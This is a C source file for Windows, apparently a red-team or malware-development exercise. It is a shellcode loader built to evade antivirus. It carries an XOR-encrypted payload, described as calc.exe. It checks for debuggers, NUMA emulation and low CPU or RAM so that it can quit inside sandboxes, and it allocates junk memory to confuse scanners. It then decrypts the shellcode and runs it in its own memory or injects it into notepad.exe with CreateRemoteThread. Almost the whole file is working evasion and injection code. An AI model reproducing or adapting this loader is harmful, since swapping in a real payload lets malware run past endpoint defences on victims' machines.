#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
#include <tlhelp32.h> // Used in findPID()

/* Program using several methods to avoid antivirus (AV) discovery. */

/* Payload: currently calc.exe, has been XORed */
unsigned char payload[] = { 0x91, 0x31, 0xf0, 0x91, 0x80, 0x8d, 0xb2, 0x73, 0x65, 0x63, 0x33, 0x34, 0x35, 0x3b, 0x37, 0x28, 0x3b, 0x31, 0x42, 0xa7, 0x15, 0x2d, 0xf9, 0x21, 0x5, 0x2b, 0xf9, 0x37, 0x6c, 0x23, 0xee, 0x2b, 0x4d, 0x31, 0xf8, 0x7, 0x20, 0x2d, 0x7d, 0xc4, 0x2f, 0x29, 0x3f, 0x54, 0xbd, 0x23, 0x54, 0xb9, 0xc1, 0x45, 0x12, 0x9, 0x72, 0x49, 0x52, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x87, 0x94, 0x3f, 0x38, 0x22, 0x3d, 0xfb, 0x37, 0x52, 0xf8, 0x27, 0x5f, 0x3a, 0x64, 0xa4, 0xe0, 0xe5, 0xf1, 0x6d, 0x79, 0x73, 0x3d, 0xf5, 0xa5, 0x6, 0x14, 0x2d, 0x62, 0xa2, 0x35, 0xff, 0x23, 0x7d, 0x3d, 0xe6, 0x39, 0x53, 0x3c, 0x71, 0xb5, 0x91, 0x25, 0x2d, 0x9c, 0xbb, 0x24, 0xff, 0x5f, 0xed, 0x31, 0x6c, 0xaf, 0x3e, 0x44, 0xb9, 0x2d, 0x43, 0xb3, 0xc9, 0x22, 0xb3, 0xac, 0x79, 0x2a, 0x64, 0xb8, 0x55, 0x99, 0x6, 0x84, 0x3c, 0x66, 0x3e, 0x57, 0x6d, 0x26, 0x4b, 0xb4, 0x1, 0xb3, 0x3d, 0x3d, 0xe6, 0x39, 0x57, 0x3c, 0x71, 0xb5, 0x14, 0x32, 0xee, 0x6f, 0x3a, 0x21, 0xff, 0x2b, 0x79, 0x30, 0x6c, 0xa9, 0x32, 0xfe, 0x74, 0xed, 0x3a, 0x72, 0xb5, 0x22, 0x2a, 0x24, 0x2c, 0x35, 0x3c, 0x23, 0x2c, 0x21, 0x32, 0x2c, 0x31, 0x3f, 0x3a, 0xf0, 0x89, 0x43, 0x33, 0x37, 0x8b, 0x8b, 0x3d, 0x38, 0x34, 0x23, 0x3b, 0xfe, 0x62, 0x8c, 0x25, 0x8c, 0x9a, 0x9c, 0x2f, 0x2d, 0xce, 0x6a, 0x65, 0x79, 0x6d, 0x79, 0x73, 0x75, 0x70, 0x2d, 0xff, 0xfe, 0x64, 0x62, 0x72, 0x65, 0x35, 0xd1, 0x54, 0xf2, 0x2, 0xfe, 0x8c, 0xa0, 0xcb, 0x95, 0xc7, 0xd1, 0x33, 0x22, 0xc8, 0xc3, 0xe1, 0xd6, 0xf8, 0x86, 0xb8, 0x31, 0xf0, 0xb1, 0x58, 0x59, 0x74, 0xf, 0x6f, 0xe3, 0x89, 0x85, 0x1, 0x6e, 0xde, 0x3e, 0x7e, 0xb, 0x1c, 0x1f, 0x70, 0x3c, 0x33, 0xfa, 0xbf, 0x9c, 0xa7, 0x6, 0x15, 0x7, 0x6, 0x57, 0x8, 0x1, 0x16, 0x75 };
unsigned int payload_len = sizeof(payload);
char decryption_key[] = "mysupersecretkey"; // Key for XOR decryption
char process_to_inject[] = "notepad.exe"; // Name of process used in process injection with CreateRemoteThread()

/* deXOR with decryption_key[] */
void deXOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j=0;

    for(int i=0; i<(int)data_len; i++){
        if(j == (int)key_len -1)
            j=0;
        data[i]=data[i]^key[j];
        j++;
    }
}

/* This memory allocation works for systems with more than one physical CPU, wont work in some AV emulators */
int checkNUMA(){
    typedef LPVOID (WINAPI * pVirtualAllocExNuma)( // Help structure
        HANDLE         hProcess,
        LPVOID         lpAddress,
        SIZE_T         dwSize,
        DWORD          flAllocationType,
        DWORD          flProtect,
        DWORD          nndPreferred
    );

    pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocExNuma");
    if(myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0) != NULL)
        return 0;
    else
        return 1;
}

/* Basic resource processor cores and ram size check, AV sandbox might not have much */
int checkResources(){
    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;

    // Check number of processor cores, aborts if less than 2
    GetSystemInfo(&s);
    if(s.dwNumberOfProcessors < 2)
        return 1;

    // Check RAM size, aborts if less than 2 Gb
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if((ms.ullTotalPhys /1024/1024/1024) < 2)
        return 1;

    return 0;
}

/* Wrapper for various sandbox detection functions */
int checkSandbox(){
    if(IsDebuggerPresent()){ // Dynamic analysis might be using debugger
        printf("checkSandbox(): IsDebuggerPresent(): triggered!\n");
        return 1;}

    if(checkNUMA()){ // AV sandbox detection, NUMA allocation
        printf("checkSandbox(): checkNUMA(): triggered!\n");
        return 1;}

    if(checkResources()){ // Resource availability check, sandbox detection
        printf("checkSandbox(): checkResources(): triggered!\n");
        return 1;}

    return 0;
}

/* Allocates 100 MB of useless RAM, which makes it harder for AV to find payload */
int uselessMemory(){
    char *memdump = NULL;

    memdump = (char *) malloc(100000000);

    if(memdump != NULL){
        memset(memdump, 00, 100000000);
        free(memdump);
        return 0;
    }
    else{
        printf("ERROR: uselessMemory(): Failed to allocate memory!\n");
        return 1;
    }
}

/* Runs payload in the memory of this process, with CreateThread() */
int threadHERE(){
    void *payload_mem;
    HANDLE th; // Thread handle
    DWORD oldprotect = 0;

    // Allocate a memory buffer for payload
	payload_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if(payload_mem == NULL){
        printf("ERROR: threadHERE(): Failed to allocate memory!\n");
        return 1;
	}

	// Decrypt (DeXOR) the payload
	deXOR((char *) payload, payload_len, decryption_key, sizeof(decryption_key));

    // Copy payload to the buffer
    RtlMoveMemory(payload_mem, payload, payload_len);

    // Make the buffer executable, done here in case AV checked for memory allocated as executable
	if(VirtualProtect(payload_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect) == 0){
        printf("ERROR: threadHERE(): Failed to make payload executable in memory!\n");
        return 1;
	}

    // Run payload
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
    if(th == NULL){
        printf("ERROR: threadHERE(): Failed to create thread!\n");
        return 1;
	}
	else{
        WaitForSingleObject(th, -1);
        return 0;
	}

    return 0;
}

/* Finds process ID from its name */
int findPID(const char *proccess_name) {
    HANDLE hProcSnap; // Process snapshot
    PROCESSENTRY32 pe32;
    int pid = 0;

    // Take a snapshot of all processes in the system.
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(INVALID_HANDLE_VALUE == hProcSnap)
        return 0;

    // Set the size of the structure before using it
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process and exit if unsuccessful
    if(!Process32First(hProcSnap, &pe32)){
        CloseHandle(hProcSnap);
        return 0;
    }

	// Loops through the process list and looks for matching string.
    while(Process32Next(hProcSnap, &pe32)){
        if(lstrcmpiA(proccess_name, pe32.szExeFile) == 0){
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    return pid;
}


/* Inner part of process injection with CreateRemoteThread() */
int threadELSEWHERE2(HANDLE process_handle, unsigned char * payload, unsigned int payload_len){
	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

  	// Creates a buffer in memory for shellcode
	pRemoteCode = VirtualAllocEx(process_handle, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	if(pRemoteCode == NULL){
        printf("ERROR: threadELSEWHERE2(): Failed to allocate memory!\n");
        return 1;
	}

	// Decrypt (DeXOR) the payload
	deXOR((char *) payload, payload_len, decryption_key, sizeof(decryption_key));

	// Copies the shellcode into the allocated buffer space
	WriteProcessMemory(process_handle, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	// Triggers the shellcode
	hThread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	if(hThread == NULL){
        printf("ERROR: threadELSEWHERE2(): Failed to create thread!\n");
        return 1;
	}

    WaitForSingleObject(hThread, -1);
    CloseHandle(hThread);
    return 0;
}

/* Runs payload in the memory of another process, with CreateRemoteThread() */
int threadELSEWHERE(){
    int pid = 0; // Process id, payload will be injected into it
    HANDLE ph = NULL; // Process handle

	pid = findPID(process_to_inject);
	if(pid){
		printf("%s: PID -> %d\n", process_to_inject, pid);

		// Open the process
		ph = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, (DWORD)pid);
		if(ph == NULL){
			printf("ERROR: threadELSEWHERE(): Could not open process to inject (%s)!\n", process_to_inject);
			return 1;
		}
		else{
            if(threadELSEWHERE2(ph, payload, payload_len))
                return 1;
            else{
                CloseHandle(ph);
                return 0;
            }
		}
	}

	else{
        printf("ERROR: threadELSEWHERE(): Could not find process to inject (%s)!\nIs it running?\n", process_to_inject);
        return 1;
	}

	return 0;
}

int main(int argc, char* argv[]){

    if(checkSandbox()) // Basic dynamic analysis prevention
        return 0;
    if(uselessMemory()) // Allocates useless memory, AV might overlook the payload then
        return 0;

    if(threadHERE()) // Runs payload in the memory of this process
        return 0;
    /*if(threadELSEWHERE()) // Runs payload in the of chosen process
        return 0;*/

    return 0;
}
